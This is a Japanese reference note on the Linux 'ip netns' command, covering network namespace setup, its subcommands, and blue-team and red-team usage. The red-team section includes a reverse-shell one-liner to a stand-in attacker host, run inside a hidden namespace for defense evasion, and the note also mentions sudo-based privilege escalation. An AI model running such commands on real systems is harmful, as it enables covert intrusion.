---
tags:
  - ip_netns
  - ip
  - namespace
  - networking
  - container
  - docker
  - chroot
  - ip_link
created: 2025-06-29 15:02
modified: 2026-01-18 18:03
environment:
  - OS/Linux
vulnearability: []
knowledge_category: Command
---

# Command  - Linux - ip_netns - ネットワーク名前空間 (Network Namespace) を管理する

## 概要

`ip netns` は、Linuxカーネルが持つ**ネットワーク名前空間 (network namespace)** を作成・管理・操作するためのコマンドです。ネットワーク名前空間は、一台のLinuxマシンの中に、それぞれが独立したネットワークインターフェイス、ルーティングテーブル、ファイアウォールルールを持つ、**隔離された仮想的なネットワーク環境**を作り出す機能です。

この技術は **Docker などのコンテナ技術の根幹**をなしており、コンテナごとに独立したIPアドレスやポート空間を持たせることを可能にしています。

(出自: `iproute2` パッケージに含まれる)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- |:---|
| **コンテナ (Dockerなど)** | コンテナは、ネットワーク名前空間に加え、プロセスID(PID)やファイルシステムなど、他の名前空間も組み合わせて、より完全な実行環境として隔離します。 | Docker |
| **`chroot`** | `chroot` は**ファイルシステム**のルート(`/`)を隔離します。`ip netns` は**ネットワークスタック**を隔離します。 | - |
| **仮想マシン (KVMなど)**| ハードウェアを仮想化し、独立したOSカーネルを丸ごと実行することで、最も強力な隔離を実現します。名前空間は、単一のホストカーネルを共有する軽量な技術です。 | - |

## よく連携されるコマンド

`ip netns` は、仮想インターフェイスを作成する `ip link` と連携して、隔離されたネットワーク環境同士を接続する際によく使われます。

### シナリオ例: 2つの名前空間を `veth` で接続する (インフラ構築・運用視点)

* **目的**: 2つの隔離されたネットワーク環境 (`ns1`, `ns2`) を作成し、仮想的なLANケーブル (`veth`ペア) で相互に通信できるようにする。
* **連携コマンド**: `ip netns`, `ip link`, `ip addr`
* **解説**: `ip netns add` で名前空間を作成し、`ip link add type veth` で仮想インターフェイスのペアを作成します。その後、`ip link set` で各インターフェイスを名前空間に移動させ、`ip netns exec` で各名前空間の中に入ってIPアドレスを設定します。
* **コマンド例**:

```bash
# このコマンドシーケンスで、隔離された2ノードの仮想ネットワークを構築する
# 1. 2つの名前空間 ns1, ns2 を作成
sudo ip netns add ns1
sudo ip netns add ns2

# 2. vethペア (veth1 と veth2) を作成
sudo ip link add veth1 type veth peer name veth2

# 3. 各vethをそれぞれの名前空間に移動
sudo ip link set veth1 netns ns1
sudo ip link set veth2 netns ns2

# 4. 各名前空間内でIPアドレスを設定し、インターフェースを有効化
sudo ip netns exec ns1 ip addr add 10.0.0.1/24 dev veth1
sudo ip netns exec ns1 ip link set veth1 up
sudo ip netns exec ns2 ip addr add 10.0.0.2/24 dev veth2
sudo ip netns exec ns2 ip link set veth2 up

# 5. ns1 から ns2 へpingを実行して疎通確認
sudo ip netns exec ns1 ping 10.0.0.2
```

## オプション説明 (`ip netns` のサブコマンド)

| オプション | 説明 |
| :--- | :--- |
| **管理コマンド** | |
| ⭐ `list` (or `ls`) | 存在する全てのネットワーク名前空間を一覧表示します。 |
| ⭐ `add <name>` | `<name>` という名前の新しいネットワーク名前空間を作成します。 |
| ⭐ `delete <name>` | 指定した名前空間を削除します。 |
| ⭐ `exec <name> <command>`| **最も重要なコマンド**。`<name>` の名前空間の**中で**、指定した `<command>` を実行します。 |
| **情報表示** | |
| `identify <PID>` | 指定したプロセスIDが、どの名前空間に属しているかを特定します。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 複雑なネットワーク構成やルーティングの挙動を、他の環境に影響を与えずに検証する。
* **組み合わせ**: `ip netns add`, `ip link add type veth`, `ip netns exec`
* **解説**: 上記の「よく連携されるコマンド」のシナリオ例の通り、一台のマシン上で完全に隔離された仮想的なネットワーク環境を複数構築し、ルーティングやファイアウォールのルールを安全にテストできます。
* **例**:

```bash
# ns1 の中でルーティングテーブルを確認する
sudo ip netns exec ns1 ip route
```

### 2. ブルーチーム視点

* **タスク**: マルウェアのネットワーク活動を、安全なサンドボックス環境で動的に解析する。
* **組み合わせ**: `ip netns add sandbox`, `ip netns exec sandbox <malware>`
* **解説**: 解析用の名前空間を作成し、その中でマルウェアを実行します。これにより、マルウェアはホストのネットワークには一切アクセスできず、その全ての通信は事前に設定した監視用の仮想インターフェイスを経由します。これにより、マルウェアがどのC2サーバーと通信しようとするかを安全に監視・分析できます。
* **例**:

```bash
# sandbox名前空間内でマルウェアを実行
sudo ip netns exec sandbox /path/to/malware
```

### 3. レッドチーム視点

* **タスク**: **活動の隠蔽 (Defense Evasion)**。標準的な監視ツールから自身のネットワーク活動を隠す。
* **組み合わせ**: `ip netns exec <hidden_net> <attacker_tool>`
* **解説**: 攻撃者がroot権限を奪取した後、秘密の名前空間を作成します。そして、リバースシェルや `nmap` スキャナといった攻撃ツールを全て `ip netns exec` 経由で実行します。ホストのデフォルト名前空間で `ss` や `netstat` を実行しても、秘密の名前空間内で開かれているソケットやプロセスは表示されないため、攻撃者は自身の活動を発見されにくくできます。
* **例**:

```bash
# hidden-ns の中でリバースシェルを起動
sudo ip netns exec hidden-ns nc attacker.com 4444 -e /bin/bash
```

## エラーメッセージとトラブルシューティング

* 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。

1. **エラーメッセージ例 1**: `Cannot open network namespace "<name>": No such file or directory`
		* **考えられる原因**: 指定した名前空間が存在しません。
		* **解決策**: `ip netns list` を実行して、存在する名前空間を確認してください。

## 環境変数と設定ファイル

* `ip netns` の動作に直接影響する環境変数は通常ありません。
* 一般的な環境変数・設定ファイルは [Linux共通の環境変数・設定ファイル](./environment_and_config.md) を参照。

### 関連する設定ファイル

* **`/var/run/netns/`**: `ip netns add` で作成された名前空間は、このディレクトリ配下にファイルとしてマウントポイントが作成されることで、プロセスが存在しない間も維持されます。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: 名前空間は単一のホストカーネルを共有します。そのため、カーネル自体の脆弱性（Kernel Exploit）が存在する場合、ある名前空間内のプロセスがそれを悪用して隔離を破り、ホストや他の名前空間に影響を与える可能性があります。
* **悪用シナリオ**: 攻撃者がroot権限を奪取した場合、レッドチームのシナリオで述べたように、自身のネットワーク活動を隠蔽するために名前空間を悪用します。

### GTFOBins / LOLBAS における利用例

* **機能**: **Privilege Escalation**
* **解説**: `ip netns exec` は `ip` コマンドのサブコマンドです。もしユーザーが `sudo ip` を実行できる権限を持っている場合、`-f` オプションでスクリプトファイルを読み込ませる機能などを悪用して、任意のコマンドを実行することが可能です。
* **参照**: `https://gtfobins.github.io/gtfobins/ip/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: 最小権限の原則に従い、一般ユーザーに `ip` コマンドの `sudo` 権限を安易に与えない。
* **Detection (検知)**: `auditd` を使って、`setns` システムコールの実行や、`/var/run/netns/` 配下のファイル作成を監視し、意図しない名前空間の作成を検知する。

## 注意点・補足

* **永続性**: `ip netns add` で作成された名前空間は、システムを再起動すると消滅します。永続化するには、起動スクリプトなどで再度作成する必要があります。

